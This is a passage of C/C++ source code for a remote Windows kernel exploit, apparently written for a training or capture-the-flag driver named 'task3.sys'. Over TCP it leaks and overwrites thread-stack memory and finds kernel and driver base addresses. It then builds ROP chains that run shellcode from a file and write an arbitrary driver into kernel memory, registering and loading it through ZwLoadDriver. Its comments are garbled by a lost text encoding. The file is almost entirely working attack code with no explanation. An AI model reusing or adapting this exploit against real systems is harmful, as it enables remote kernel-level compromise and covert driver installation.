        ropChain[ropIndex++] = funcAddrs[RtlWriteRegistryValue];
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;
        ropChain[ropIndex++] = addrValueIP;
        ropChain[ropIndex++] = REG_EXPAND_SZ;
        ropChain[ropIndex++] = addrValueSIP;
        ropChain[ropIndex++] = sizeof(servIP);

        // Type
        ropChain[ropIndex++] = funcAddrs[RtlWriteRegistryValue];
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;
        ropChain[ropIndex++] = addrValueType;
        ropChain[ropIndex++] = REG_DWORD;
        ropChain[ropIndex++] = addrType;
        ropChain[ropIndex++] = sizeof(valueType);

        // ErrorControl
        ropChain[ropIndex++] = funcAddrs[RtlWriteRegistryValue];
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;
        ropChain[ropIndex++] = addrValueEC;
        ropChain[ropIndex++] = REG_DWORD;
        ropChain[ropIndex++] = addrEC;
        ropChain[ropIndex++] = sizeof(valueEC);

        // Start
        ropChain[ropIndex++] = funcAddrs[ZwLoadDriver];
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;
        ropChain[ropIndex++] = addrValueStart;
        ropChain[ropIndex++] = REG_DWORD;
        ropChain[ropIndex++] = addrStart;
        ropChain[ropIndex++] = sizeof(valueStart);

        // frame ZwLoadDriver
        ropChain[ropIndex++] = glDriverBase + rva_PR_CloseSocket2;
        ropChain[ropIndex++] = addrUsDrFullPath;

        // exit
        ropChain[ropIndex++] = leakSock;

        if (!MemWork(worker,
            mem_write,
            addrStartRop,
            ropChain,
            (ropIndex * 4))) {

            CloseSock(&tmpSock);
            return FALSE;
        }
    }

    Sleep(3000);
    // ������� ��� ���
    CloseSock(&tmpSock);

    return TRUE;
}

BOOL Exploit() {
	
    BOOL retValue = FALSE;
    SOCKETS socks = { INVALID_SOCKET , INVALID_SOCKET };
    SOCKET tmpSock = INVALID_SOCKET;
    //PCHAR buf;
    short newLengthArr = 0x7fff;
    ULONG stackAddrCon1 = 0, stackAddrCon2 = 0;
    ULONG diffStaks = 0, tmpDiff = 0;
    ULONG leakSock = 0, tmpLeak = 0;
    int iToLeakSock = 0, tmpIndex;
    ULONG stackMain = 0, stackTarget = 0;
    DWORD counterTmpSocks = 0;
    PIMAGE_DOS_HEADER pIDH = NULL; 
    PIMAGE_NT_HEADERS32 pINtH = NULL;
    MEM_WORK worker;
    ULONG st = RtlNtStatusToDosError(0);
    /*ZydisDecoder decoder;
    ZydisDecodedInstruction instr;
    ZydisInit(&decoder, NULL);
    int codeS;
    PBYTE code = AssembleFasm32((char*)"call 0x11223344", &codeS);
    ZydisDecoderDecodeBuffer(&decoder,
        code,
        codeS,
        &instr);*/

    for (int i = 0; i < COUNT_SOCKS; ++i) {
        worker.socks.tmpSocks[i] = INVALID_SOCKET;
    }
    
    // ���������������� ����
    {
        if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
        if (!ReadMem(tmpSock, -1, &stackAddrCon1)) {
            CloseSock(&tmpSock);
            return FALSE;
        }
        printf("stack addr in first conneciton \t%08X\n", stackAddrCon1);
        worker.socks.mainSock = tmpSock;
        while (TRUE) {
            if (counterTmpSocks >= COUNT_SOCKS) {
                for (int i = 0; i < COUNT_SOCKS; ++i) {
                    CloseSock(&worker.socks.tmpSocks[i]);
                }
                counterTmpSocks = 0;
            }
            // second connection
           // printf(".");
            if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
            worker.socks.tmpSocks[counterTmpSocks] = tmpSock;
            counterTmpSocks++;
            /*if (!SendToTarget(tmpSock, getReq_m1, sizeof(getReq_m1) - 1)) {
                CloseTarget(tmpSock);
                return FALSE;
            }
            if (RecvFromTarget(tmpSock, &stackAddrCon2, 4) != 4) {
                CloseTarget(tmpSock);
                return FALSE;
            }*/

            if (!ReadMem(tmpSock, -1, &stackAddrCon2)) {
                CloseAllConnections(&socks);
                return FALSE;
            }
            //printf("stack addr in second conneciton \t%08X\n", stackAddrCon2);
            worker.stacks.diffStacks = stackAddrCon1 > stackAddrCon2
                ? stackAddrCon1 - stackAddrCon2
                : stackAddrCon2 - stackAddrCon1;
            //printf("Difference between thread stacks: \t%08X\n", diffStaks);
            if (((worker.stacks.diffStacks / 4) + 0x498) > MAXSHORT) {
                //CloseSock(tmpSock);
                continue;
            }

            if (stackAddrCon1 > stackAddrCon2) {
                worker.socks.targetSock = tmpSock;
                worker.stacks.mainStack = stackAddrCon1;
                worker.stacks.targetStack = stackAddrCon2;
            }
            else {
                worker.socks.targetSock = worker.socks.mainSock;
                worker.socks.mainSock = tmpSock;
                worker.stacks.mainStack = stackAddrCon2;
                worker.stacks.targetStack = stackAddrCon1;
            }
            worker.stacks.targetStack = worker.stacks.targetStack - 0x408 - 4; // ������ ������ ads ���������
            worker.stacks.mainStack = worker.stacks.mainStack - 0x408 - 4;

            tmpIndex = ((worker.stacks.mainStack - worker.stacks.targetStack - 0x400) / 4) * (-1);
            if (!ReadMem(worker.socks.mainSock, tmpIndex, &tmpLeak)) {
                CloseAllConnections(&socks);
                return FALSE;
            }
            printf("Leak %08X\n", tmpLeak & 0xFFFF);
            if (!WriteMem(worker.socks.mainSock, tmpIndex, (LPVOID)&newLengthArr)) {
                CloseAllConnections(&socks);
                return FALSE;
            }
            if (!ReadMem(worker.socks.mainSock, tmpIndex, &tmpLeak)) {
                CloseAllConnections(&socks);
                return FALSE;
            }
            /*iToLeakSock = GET_INDEX(diffStaks - 0x84 - 8);
            if (!ReadMem(worker.socks.mainSock, getReq, iToLeakSock, &leakSock)) {
                CloseAllConnections(&socks);
                return FALSE;
            }*/
            //printf("*******************************************\r");
            //if (leakSock > worker.stacks.targetStack) {
            //    //CloseSock(tmpSock);
            //    continue;
            //}
            //diffStaks = worker.stacks.targetStack - leakSock;
            //if ((diffStaks / 4) > MAXSHORT) {
            //    //CloseSock(tmpSock);
            //    continue;
            //}

            worker.socks.tmpSocks[counterTmpSocks-1] = INVALID_SOCKET;
            break;
        }
        tmpIndex = GET_INDEX_DOWN(worker.stacks.targetStack, 8);
        if (!ReadMem(worker.socks.targetSock, tmpIndex, &tmpLeak)) {
            CloseAllConnections(&socks);
            return FALSE;
        }
        glDriverBase = tmpLeak - rvaToStrQUIT;

        tmpSock = worker.socks.mainSock;
        worker.socks.mainSock = worker.socks.targetSock;
        worker.socks.targetSock = tmpSock;
        
        ULONG tmp = worker.stacks.targetStack;
        worker.stacks.targetStack = worker.stacks.mainStack;
        worker.stacks.mainStack = tmp;
        worker.stacks.isUp = TRUE;

        worker.leakSock = INVALID_SOCKET;

        printf("\n");
        printf("target stack: \t%08X\nmain stack\t%08X\n", worker.stacks.targetStack, worker.stacks.mainStack);
        //printf("Leak %08X\n", tmpLeak);
        printf("IB driver \t%08X\n", glDriverBase);

    }
    Sleep(1000);
    if (StartMemWork(&worker)) {
        // ���� ����� ����
      
        PULONG impFuncAddresses = (PULONG)malloc(16);
        if (MemWork(&worker,
            mem_read,
            glDriverBase + rva_NetioImpAddr,
            (LPVOID)impFuncAddresses,
            12)) {

            for (int i = 0; i < 3; i++) {
                printf("addr %d -> %08X\n", i, impFuncAddresses[i]);
            }

            if (FindImageBaseByAddr(&worker, impFuncAddresses[2], &glKernelBase)) {
                printf("IB kernel: \t%08X\n", glKernelBase);
            }
            /*if (FindImageBaseByAddr(&worker, impFuncAddresses[0], &glNetioBase)) {
                printf("IB NETIO: \t%08X\n", glNetioBase);
            }*/
            
            KERNEL_MODULE driver, kernel;
            RtlZeroMemory(&driver, sizeof(KERNEL_MODULE));
            RtlZeroMemory(&kernel, sizeof(KERNEL_MODULE));
            
            LoadPeImage(&kernel, &worker, glKernelBase);
            //driver.name = "ntoskrnl.exe";
            modules.push_back(kernel);

            LoadPeImage(&driver, &worker, glDriverBase);
            driver.name = "task3.sys";
            modules.push_back(driver);

            // ������ �������
            ULONG osVerAddr = FindExportByName(&kernel.pe, &worker, "NtBuildNumber", glKernelBase);
            if (!MemWork(&worker,
                mem_read,
                osVerAddr,
                &glOsVer,
                2)) {

                goto end;
            }
            printf("os ver: \t%hu\n", glOsVer);

            if (glOsVer != Win10 && glOsVer != Win7) {
                if (!GetAllModulesByIAT(modules, &worker, driver)) {
                    goto end;
                }

                if (!GetAllModulesByIAT(modules, &worker, kernel)) {
                    goto end;
                }
            }

            gadgets.resize(AllGadgets);
            funcAddrs.resize(AllFunctions);

            // ������� ������� POP reg; ret
            {
                char popGadgets[AllPopGadgets][12];
                memcpy(popGadgets[popEax], "pop eax\nret", 12);
                memcpy(popGadgets[popEbx], "pop ebx\nret", 12);
                memcpy(popGadgets[popEcx], "pop ecx\nret", 12);
                memcpy(popGadgets[popEdx], "pop edx\nret", 12);
                memcpy(popGadgets[popEdi], "pop edi\nret", 12);
                memcpy(popGadgets[popEsi], "pop esi\nret", 12);
                memcpy(popGadgets[popEbp], "pop ebp\nret", 12);

                PEXCLUDED_TYPE excludes;
                const char* exclMnem[] = {
                    (char*)"leave",
                    "mov",
                    NULL
                };
                const char* exclRegs[] = {
                    "esp",
                    NULL
                };
                /*if (!InitExcluded(&excludes, NULL, NULL, TRUE, TRUE)) {
                    goto end;
                }*/
                if (!InitExcluded(&excludes, (char**)exclMnem, (char**)exclRegs, FALSE, TRUE)) {
                    goto end;
                }
                ULONG countRet;
                ULONG gadPopReg = 0;
                for (int i = 0; i < AllPopGadgets; ++i) {
                    gadPopReg = FindRopGadget(modules, (char*)popGadgets[i], &countRet, excludes, 0);
                    gadgets[i] = std::make_pair(gadPopReg, countRet);
                    printf("%s -> %08X\n", popGadgets[i], gadPopReg);
                }
            }

            // ������� ������ invlpg [eax]; ret
            char sGadInvlpg[] =
                "invlpg byte [eax]\n"
                "ret"
                ;
            ULONG gadInvlpg = 0, countRetnInvlpg = 0;
            gadInvlpg = FindRopGadget(modules, sGadInvlpg, &countRetnInvlpg, NULL, 1);
            printf("[EXEC SC] gadget invlpg -> %08X\n", gadInvlpg);

            gadgets[invlpgEax] = std::make_pair(gadInvlpg, countRetnInvlpg);

            // ���������� ���������
            {
                HANDLE hSc;
                if ((hSc = CreateFileA("sc.bin",
                    GENERIC_READ,
                    FILE_SHARE_READ,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL)) == INVALID_HANDLE_VALUE) {

                    printf("[EXEC SC] Error open sc file\n");
                    goto end;
                }

                PBYTE sc = (PBYTE)malloc(0x1000);
                RtlZeroMemory(sc, 0x1000);
                BY_HANDLE_FILE_INFORMATION fileInf;
                if (!GetFileInformationByHandle(hSc, &fileInf)) {

                    printf("[EXEC SC] Error get file inf\n");
                    CloseHandle(hSc);
                    goto end;
                }
                ULONG scLen = fileInf.nFileSizeLow;
                printf("[EXEC SC] sc size = %08X\n", fileInf.nFileSizeLow);

                DWORD outLen = 0;
                if (!ReadFile(hSc,
                    sc,
                    scLen,
                    &outLen,
                    NULL)) {

                    printf("[EXEC SC] Error read sc file\n");
                    CloseHandle(hSc);
                    goto end;
                }

                CloseHandle(hSc);

                if (scLen != 0) {
                    int i = 0;
                    for (size_t i = 0; i < modules.size(); i++) {
                        ULONG scAddr = FindFreePlaceInSection(&modules[i], scLen + 12);
                        if (scAddr != 0) {
                            printf("[EXEC SC] addr sc in code section = %08X\n", scAddr);
                            //if (glOsVer == Win8 || glOsVer == Win7) {
                                ExecScInCodeSection(&worker, sc, scLen, scAddr);
                            //}
                            break;
                        }
                    }
                    ExecScInStack(&worker, sc, scLen);
                }
                free(sc);
            }

            // ������ ��������
            {
                HANDLE hDr;
                if ((hDr = CreateFileA("Driver.sys",
                    GENERIC_READ,
                    FILE_SHARE_READ,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL)) == INVALID_HANDLE_VALUE) {

                    printf("[LOAD DRIVER] Error open sc file\n");
                    goto end;
                }

                BY_HANDLE_FILE_INFORMATION fileInf;
                if (!GetFileInformationByHandle(hDr, &fileInf)) {

                    printf("[LOAD DRIVER] Error get file inf\n");
                    CloseHandle(hDr);
                    goto end;
                }

                ULONG driverLen = fileInf.nFileSizeLow;
                PBYTE dr = (PBYTE)malloc(driverLen);
                DWORD outLen = 0;
                if (!ReadFile(hDr,
                    dr,
                    driverLen,
                    &outLen,
                    NULL)) {

                    printf("[LOAD DRIVER] Error read sc file\n");
                    CloseHandle(hDr);
                    goto end;
                }

                CloseHandle(hDr);

                printf("[LOAD DRIVER] Read driver; len = %08X\n", outLen);

                char sGadMovMemRegEax[] = "mov dword [ecx], eax\nret";
                PEXCLUDED_TYPE excludes;
                const char* exclMnem[] = {
                    (char*)"leave",
                    "mov",
                    NULL
                };
                const char* exclRegs[] = {
                    "esp",
                    NULL
                };
                /*if (!InitExcluded(&excludes, NULL, NULL, TRUE, TRUE)) {
                    goto end;
                }*/
                if (!InitExcluded(&excludes, (char**)exclMnem, (char**)exclRegs, FALSE, TRUE)) {
                    goto end;
                }

                ULONG countRet;
                ULONG gadAddr = FindRopGadget(modules, sGadMovMemRegEax, &countRet, excludes, 0);
                printf("Gadget %s -> %08X\n", sGadMovMemRegEax, gadAddr);
                gadgets[movMemEcxEax] = std::make_pair(gadAddr, countRet);

                funcAddrs[ExAllocatePool] = FindExportByName(&modules[0].pe, &worker, "ExAllocatePool", glKernelBase);
                printf("ExAllocatePool addr: \t%08X\n", funcAddrs[ExAllocatePool]);

                SOCKET saveSock = INVALID_SOCKET;
                ULONG addrDr, addrForSave;
                if (!WriteDriverWithAllocMem(&worker, dr, driverLen, &addrDr, &saveSock, &addrForSave)) {

                    CloseSock(&saveSock);
                    free(dr);
                    goto end;
                }

                free(dr);

                printf("[LOAD DRIVER] Alloc addr: %08X\n", addrDr);

                funcAddrs[ZwCreateFile] = FindExportByName(&modules[0].pe, &worker, "ZwCreateFile", glKernelBase);
                printf("ZwCreateFile addr: \t%08X\n", funcAddrs[ZwCreateFile]);
                funcAddrs[ZwClose] = FindExportByName(&modules[0].pe, &worker, "ZwClose", glKernelBase);
                printf("ZwClose addr: \t%08X\n", funcAddrs[ZwClose]);
                funcAddrs[ZwWriteFile] = FindExportByName(&modules[0].pe, &worker, "ZwWriteFile", glKernelBase);
                printf("ZwWriteFile addr: \t%08X\n", funcAddrs[ZwWriteFile]);
                funcAddrs[ExFreePool] = FindExportByName(&modules[0].pe, &worker, "ExFreePool", glKernelBase);
                printf("ExFreePool addr: \t%08X\n", funcAddrs[ExFreePool]);
                funcAddrs[RtlCreateRegistryKey] = FindExportByName(&modules[0].pe, &worker, "RtlCreateRegistryKey", glKernelBase);
                printf("RtlCreateRegistryKey addr: \t%08X\n", funcAddrs[RtlCreateRegistryKey]);
                funcAddrs[RtlWriteRegistryValue] = FindExportByName(&modules[0].pe, &worker, "RtlWriteRegistryValue", glKernelBase);
                printf("RtlWriteRegistryValue addr: \t%08X\n", funcAddrs[RtlWriteRegistryValue]);
                funcAddrs[ZwLoadDriver] = FindExportByName(&modules[0].pe, &worker, "ZwLoadDriver", glKernelBase);
                printf("ZwLoadDriver addr: \t%08X\n", funcAddrs[ZwLoadDriver]);

                addrForSave += 4;
                if (!SaveDriver(&worker, addrDr, addrForSave, driverLen)) {
                    CloseSock(&saveSock);
                    goto end;
                }

                if (!LoadDriver(&worker, addrForSave)) {
                    CloseSock(&saveSock);
                    goto end;
                }
                if (glOsVer == Win7) {
                    Sleep(10000);
                }
                CloseSock(&saveSock);
            }
        }
    }
    else {
        printf("Error start mem work\n");
        system("pause");
        CloseAllConnections(&socks);
        return FALSE;
    }
    
end:
    CloseMemWork(&worker);
    system("pause");

    CloseAllConnections(&socks);
    return TRUE;
 }

int main(int argc, char** argv) {

    char* deviceName = NULL;
    BYTE* sc = NULL;
    DWORD sizeSc = 0;
    const char* host;

    if (argc < 2) {
        host = "127.0.0.1";
    }
    else {
        host = argv[1];
    }

    //sc = GetShellcodeFromStdin(&sizeSc);

    Exploit();

	return 0;
}

//----------------------------------------------